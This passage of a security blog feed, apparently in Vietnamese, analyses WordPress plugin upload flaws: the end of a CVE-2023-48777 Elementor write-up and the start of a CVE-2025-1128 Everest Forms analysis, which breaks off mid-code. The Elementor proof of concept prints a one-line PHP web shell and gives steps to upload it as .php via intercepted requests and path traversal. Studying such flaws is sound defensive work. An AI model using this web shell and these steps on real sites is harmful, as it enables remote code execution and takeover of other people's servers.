href=&#34;https://www.php.net/manual/en/function.uniqid.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;uniqid()&lt;/a&gt; để đảm bảo đường dẫn không trùng lặp. &lt;code&gt;wp_mkdir_p()&lt;/code&gt; sẽ tạo thư mục vật lý trên server để lưu trữ template này.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng &lt;code&gt;create_temp_file()&lt;/code&gt; sẽ gọi đến &lt;code&gt;file_put_contents( $temp_filename, $file_content )&lt;/code&gt; để lưu trữ nội dung của &lt;code&gt;$file_content&lt;/code&gt; vào &lt;code&gt;$temp_filename&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tận dùng việc không sanitize file name ở đây, ta kết hợp tấn công path travesal để file được lưu ở vị trí có thể truy cập được, vượt qua được tính chất ngẫu nhiên của &lt;code&gt;uniqid()&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_template( array $data ) {&#xA;    // If the template is a JSON file, allow uploading it.&#xA;    add_filter( &amp;#39;elementor/files/allow-file-type/json&amp;#39;, [ $this, &amp;#39;enable_json_template_upload&amp;#39; ] );&#xA;    add_filter( &amp;#39;elementor/files/allow_unfiltered_upload&amp;#39;, [ $this, &amp;#39;enable_json_template_upload&amp;#39; ] );&#xA;&#xA;    // Imported templates can be either JSON files, or Zip files containing multiple JSON files&#xA;    $upload_result = Plugin::$instance-&amp;gt;uploads_manager-&amp;gt;handle_elementor_upload( $data, [ &amp;#39;zip&amp;#39;, &amp;#39;json&amp;#39; ] );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;handle_elementor_upload()&lt;/code&gt; được gọi trong &lt;code&gt;import_template()&lt;/code&gt;. Theo như comment của developer thì nếu template là JSON file thì được phép upload, ta đặt debug và thực hiện upload JSON template:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Tạo post bằng Elementor&lt;/li&gt;&#xA;&lt;li&gt;Click vào folder icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/folder_icon.png&#34; title=&#34;Vị trí folder icon&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/folder_icon.png&#34; data-sub-html=&#34;&lt;h2&gt;Folder icon&lt;/h2&gt;&lt;p&gt;Vị trí folder icon&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/folder_icon.png&#39; alt=&#34;Folder icon&#34; height=&#34;1113&#34; width=&#34;1440&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Vị trí folder icon&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Click vào upload icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_icon.png&#34; title=&#34;Vị trí upload icon&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/upload_icon.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload icon&lt;/h2&gt;&lt;p&gt;Vị trí upload icon&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_icon.png&#39; alt=&#34;Upload icon&#34; height=&#34;1113&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Vị trí upload icon&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_board.png&#34; title=&#34;Giao diện upload&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/upload_board.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload board&lt;/h2&gt;&lt;p&gt;Giao diện upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_board.png&#39; alt=&#34;Upload board&#34; height=&#34;818&#34; width=&#34;1309&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giao diện upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Chọn JSON file và upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/debug.gif&#34; title=&#34;Debuger nhảy tới import_template sau khi upload JSON file&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/debug.gif&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debuger nhảy tới import_template sau khi upload JSON file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/debug.gif&#39; alt=&#34;Debug&#34; height=&#34;1115&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debuger nhảy tới import_template sau khi upload JSON file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User uploads JSON file&amp;#34;] --&amp;gt; B[&amp;#34;import_template()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;handle_elementor_upload()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;save_base64_to_tmp_file()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;create_temp_file()&amp;#34;]&#xA;E --&amp;gt; G[&amp;#34;create_unique_dir()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;file_put_contents()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;File stored without proper type validation → Arbitrary File Upload&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo JSON file chứa web shell&#xA;PHP&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;])?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload và bắt request bằng BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;Sửa đổi file extension thành PHP kết hợp path traversal và gửi request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/request.png&#34; title=&#34;Request với path traversal và .php&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request với path traversal và .php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/request.png&#39; alt=&#34;Request&#34; height=&#34;850&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request với path traversal và .php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kết quả&lt;/strong&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/result.png&#39; alt=&#34;Result&#34; height=&#34;571&#34; width=&#34;1578&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2023-48777&lt;/strong&gt; cho phép người dùng có quyền &lt;strong&gt;Contributor&lt;/strong&gt; tải lên các file độc hại do thiếu kiểm tra loại file trước khi lưu trữ. Điều này có thể dẫn đến &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; và &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; nếu máy chủ cho phép thực thi file upload. Lỗi đã được vá trong phiên bản &lt;strong&gt;3.18.2&lt;/strong&gt; bằng cách bổ sung kiểm tra phần mở rộng file hợp lệ trước khi ghi ra đĩa.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;xác thực loại file trước khi lưu&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không tin tưởng dữ liệu Base64 hoặc tên file&lt;/strong&gt; từ client.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giới hạn quyền upload&lt;/strong&gt; và tách biệt thư mục lưu file khỏi vùng thực thi mã.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elementor/vulnerability/wordpress-elementor-plugin-3-18-0-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin &amp;lt;= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-1128 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-09-cve-2025-1128/</link>
      <pubDate>Sun, 09 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-09-cve-2025-1128/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Everest Forms – Contact Forms, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; dễ bị tấn công &lt;strong&gt;arbitrary file upload, read, and deletion&lt;/strong&gt; do thiếu &lt;strong&gt;file type&lt;/strong&gt; và &lt;strong&gt;path validation&lt;/strong&gt; trong phương thức &lt;code&gt;format&lt;/code&gt; của class &lt;code&gt;EVF_Form_Fields_Upload&lt;/code&gt; ở tất cả các phiên bản đến và bao gồm &lt;strong&gt;3.0.9.4&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; có thể &lt;strong&gt;upload, read, và delete arbitrary files&lt;/strong&gt; trên server của site bị ảnh hưởng, dẫn đến khả năng &lt;strong&gt;remote code execution&lt;/strong&gt;, &lt;strong&gt;sensitive information disclosure&lt;/strong&gt;, hoặc &lt;strong&gt;site takeover&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-1128&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-1128&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.0.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.0.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.0.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.0.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng này do việc kiểm tra kiểu tệp và đường dẫn tệp chưa đủ nghiêm ngặt trong hàm &lt;code&gt;format&lt;/code&gt; của lớp &lt;code&gt;EVF _Form_Fields_Upload&lt;/code&gt;. Ngay cả khi tệp có định dạng không hợp lệ, quá trình tải lên vẫn có thể thành công, nên bằng cách sửa một vài nội dung trong dữ liệu/giao tiếp gửi lên, có thể né được việc xác thực phía máy chủ.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    ...&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;    if ( $proper_filename || ! $ext || ! $type ) {&#xA;        evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;        update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // upload file handler&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; sẽ trả về &lt;code&gt;$ext&lt;/code&gt; và &lt;code&gt;$type&lt;/code&gt; &lt;strong&gt;rỗng&lt;/strong&gt; nếu file upload không hợp lệ (không nằm trong &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;whilelist&lt;/a&gt; của WordPress).&lt;/p&gt;&#xA;&lt;p&gt;Sau khi dòng &lt;code&gt;8-9&lt;/code&gt; được thực thi, không có cơ chế nào để dừng chương trình khiến chương trình tiếp tục thực thi upload file.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã thực hiện điều này bằng cách gọi hàm &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_die/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;wp_die()&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    ...&#xA;    $wp_filetype = wp_check_filetype_and_ext( 